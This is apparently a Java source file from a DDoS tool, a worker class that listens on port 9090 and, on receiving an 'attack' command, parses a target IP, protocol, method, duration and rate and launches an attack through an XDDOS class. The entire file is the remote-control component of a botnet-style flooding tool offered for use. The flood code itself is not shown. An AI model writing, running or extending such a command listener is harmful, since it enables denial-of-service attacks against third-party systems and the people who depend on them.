package XD.WORKER;

import XD.XDDOS.XDDOS;

import java.io.BufferedReader;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.io.PrintWriter;
public class Server implements Runnable{
    @Override
        public void run(){
        try {
            ServerSocket serever = new ServerSocket(9090);
            Socket socket = serever.accept();
            BufferedReader reader = new BufferedReader(new java.io.InputStreamReader(socket.getInputStream()));
            String line = reader.readLine();
            while(line != null){
                System.out.println(line);
                line = reader.readLine();
                if(line.startsWith("attack")){
                    line = line.substring(7);
                    String ip = line.split(" ")[0];
                    int protocol = Integer.parseInt(line.split(" ")[1]);
                    String method = line.split(" ")[2];
                    int time = Integer.parseInt(line.split(" ")[3]);
                    int CPS = Integer.parseInt(line.split(" ")[4]);
                    PrintWriter writer = new PrintWriter(socket.getOutputStream());
                    if(XDDOS.attackIsRunning) {
                    writer.println("Attack is already running");
                    writer.flush();
                    }
                    else {
                    XDDOS.main(ip, protocol, method, time, CPS);
                    writer.println("Attack started");
                    writer.flush();
                    }
                }
            } 
        } catch(Exception e) {
            e.printStackTrace();
        } catch (Throwable e) {
            e.printStackTrace();
        }
    }
}
